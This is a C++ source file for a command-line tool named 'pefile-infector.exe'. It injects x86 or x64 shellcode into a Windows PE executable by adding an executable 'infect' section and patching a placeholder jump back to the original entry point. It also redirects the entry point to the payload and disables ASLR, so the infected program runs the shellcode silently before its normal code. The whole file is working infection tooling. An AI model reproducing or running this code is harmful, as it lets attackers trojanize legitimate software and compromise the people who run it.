#include <argparse/argparse.hpp>
#include <cstdlib>
#include <iostream>
#include "pe.h"
#include "exception.h"

using namespace argparse;

#pragma pack(push, 1)
typedef struct AddRaxInstruction {
    unsigned char raxReg;
    unsigned char addInstruction;
    unsigned int modifier;
} AddRaxInstruction;

typedef struct MovEaxInstruction {
    unsigned char movInstruction;
    unsigned int address;
} MovEaxInstruction;
#pragma pack(pop)

MovEaxInstruction *findJumpStub32(char *payload, unsigned long long size) {
    for (char *current = payload; current < payload + size - sizeof(MovEaxInstruction); current++) {
        auto potentialInstruction = reinterpret_cast<MovEaxInstruction *>(current);
        if (potentialInstruction->movInstruction != 0xB8) continue;
        if (potentialInstruction->address != 0xDEADBEEF) continue;
        return potentialInstruction;
    }
    throw Exception("No x86 relative jump stub found. Expected: mov eax, 0xDEADBEEF");
}

AddRaxInstruction *findJumpStub64(char *payload, unsigned long long size) {
    for (char *current = payload; current < payload + size - sizeof(AddRaxInstruction); current++) {
        auto potentialInstruction = reinterpret_cast<AddRaxInstruction *>(current);
        if (potentialInstruction->raxReg != 0x48) continue;
        if (potentialInstruction->addInstruction != 0x05) continue;
        if (potentialInstruction->modifier != 0xDEADBEEF) continue;
        return potentialInstruction;
    }
    throw Exception("No x64 relative jump stub found. Expected: add rax, 0xDEADBEEF");
}

void infectPE32(PE& input, PE& payload, std::string &payloadSectionName) {
    unsigned long long oldEntryPoint;
    unsigned long long newEntryPoint;
    {
        std::string infectSectionName = "infect";

        auto header = input.getCommitableNtHeaders32();
        oldEntryPoint = header->OptionalHeader.AddressOfEntryPoint;
        auto resumePoint = header->OptionalHeader.ImageBase + oldEntryPoint;

        auto payloadTextSection = payload.getCommitableSectionByName(payloadSectionName);
        auto payloadTextData = payload.getCommitableSectionData(payloadTextSection);

        auto clonePayload = static_cast<char*>(calloc(payloadTextSection->SizeOfRawData, sizeof(char)));
        memcpy(clonePayload, payloadTextData, payloadTextSection->SizeOfRawData);
        auto instruction = findJumpStub32(clonePayload, payloadTextSection->SizeOfRawData);
        instruction->address = resumePoint;

        input.pushNewSection(infectSectionName,
                             payloadTextSection->SizeOfRawData,
                             IMAGE_SCN_MEM_WRITE |
                             IMAGE_SCN_CNT_CODE |
                             IMAGE_SCN_CNT_UNINITIALIZED_DATA |
                             IMAGE_SCN_MEM_EXECUTE |
                             IMAGE_SCN_CNT_INITIALIZED_DATA |
                             IMAGE_SCN_MEM_READ);
        auto inputInfectSection = input.getCommitableSectionByName(infectSectionName);
        newEntryPoint = inputInfectSection->VirtualAddress;
        input.writeSectionData(inputInfectSection, clonePayload, payloadTextSection->SizeOfRawData);
        free(clonePayload);
    }
    auto header = input.getCommitableNtHeaders32();
    header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    header->OptionalHeader.AddressOfEntryPoint = newEntryPoint;
    header->FileHeader.Characteristics = 0x010F;
}

void infectPE64(PE& input, PE& payload, std::string &payloadSectionName) {
    unsigned long long oldEntryPoint;
    unsigned long long newEntryPoint;
    {
        std::string infectSectionName = "infect";

        auto header = input.getCommitableNtHeaders64();
        oldEntryPoint = header->OptionalHeader.AddressOfEntryPoint;

        auto payloadTextSection = payload.getCommitableSectionByName(payloadSectionName);
        auto payloadTextData = payload.getCommitableSectionData(payloadTextSection);

        auto clonePayload = static_cast<char*>(calloc(payloadTextSection->SizeOfRawData, sizeof(char)));
        memcpy(clonePayload, payloadTextData, payloadTextSection->SizeOfRawData);
        auto instruction = findJumpStub64(clonePayload, payloadTextSection->SizeOfRawData);
        instruction->modifier = oldEntryPoint;

        input.pushNewSection(infectSectionName,
                             payloadTextSection->SizeOfRawData,
                             IMAGE_SCN_MEM_WRITE |
                             IMAGE_SCN_CNT_CODE |
                             IMAGE_SCN_CNT_UNINITIALIZED_DATA |
                             IMAGE_SCN_MEM_EXECUTE |
                             IMAGE_SCN_CNT_INITIALIZED_DATA |
                             IMAGE_SCN_MEM_READ);
        auto inputInfectSection = input.getCommitableSectionByName(infectSectionName);
        newEntryPoint = inputInfectSection->VirtualAddress;

        input.writeSectionData(inputInfectSection, clonePayload, payloadTextSection->SizeOfRawData);
        free(clonePayload);
    }

    auto header = input.getCommitableNtHeaders64();
    header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE;
    header->OptionalHeader.DllCharacteristics &= ~IMAGE_DLLCHARACTERISTICS_HIGH_ENTROPY_VA;
    header->OptionalHeader.AddressOfEntryPoint = newEntryPoint;
    header->FileHeader.Characteristics = 0x010F;
}

void infectPE(PE &input, PE &payload86, PE &payload64, std::string &payload86SectionName,
              std::string &payload64SectionName) {
    if (input.getFormat() == IMAGE_FORMAT_PE32) {
        infectPE32(input, payload86, payload86SectionName);
    } else {
        infectPE64(input, payload64, payload64SectionName);
    }
}

int main(const int argc, const char **argv) {
    argparse::ArgumentParser program("pefile-infector.exe");

    program.add_argument("-o", "--output")
            .required()
            .help("Specify the output file.");
    program.add_argument("-i", "--input")
            .required()
            .help("Specify the input file.");
    program.add_argument("-px64", "--payload-x64")
            .required()
            .help("Specify the x64 shell payload file.");
    program.add_argument("-sx64", "--section-x64")
            .default_value(std::string(".text"))
            .required()
            .help("Specify the name of the section containing x64 shellcode.");
    program.add_argument("-px86", "--payload-x86")
            .required()
            .help("Specify the x86 shell payload file.");
    program.add_argument("-sx86", "--section-x86")
            .default_value(std::string(".text"))
            .required()
            .help("Specify the name of the section containing x86 shellcode.");

    try {
        program.parse_args(argc, argv);
    } catch (std::runtime_error&) {
        std::cout << program.help().str() << std::endl;
        return 1;
    }

    auto outputPath = program.get<std::string>("--output");
    auto inputPath = program.get<std::string>("--input");
    auto payload64Path = program.get<std::string>("--payload-x64");
    auto payload86Path = program.get<std::string>("--payload-x86");
    auto payload64SectionName = program.get<std::string>("--section-x64");
    auto payload86SectionName = program.get<std::string>("--section-x86");

    PE *target = nullptr;
    PE *payload64 = nullptr;
    PE *payload86 = nullptr;
    try {
        payload64 = new PE(payload64Path.c_str());
        payload86 = new PE(payload86Path.c_str());

        if (payload64->getFormat() != IMAGE_FORMAT_PE64) {
            throw Exception("Invalid PE32+ file.");
        }

        if (payload86->getFormat() != IMAGE_FORMAT_PE32) {
            throw Exception("Invalid PE32 file.");
        }

        target = new PE(inputPath.c_str());
        infectPE(*target, *payload86, *payload64, payload86SectionName, payload64SectionName);
        target->save(outputPath.c_str());
    } catch (Exception &e) {
        if (target) target->destroy();
        if (payload86) payload86->destroy();
        if (payload64) payload64->destroy();
        std::cout << "Failure to load/parse PE file: " + std::string(e.what()) << std::endl;
        return 1;
    }

    target->destroy();
    payload86->destroy();
    payload64->destroy();
    std::cout << "Infect successful." << std::endl;
    return 0;
}
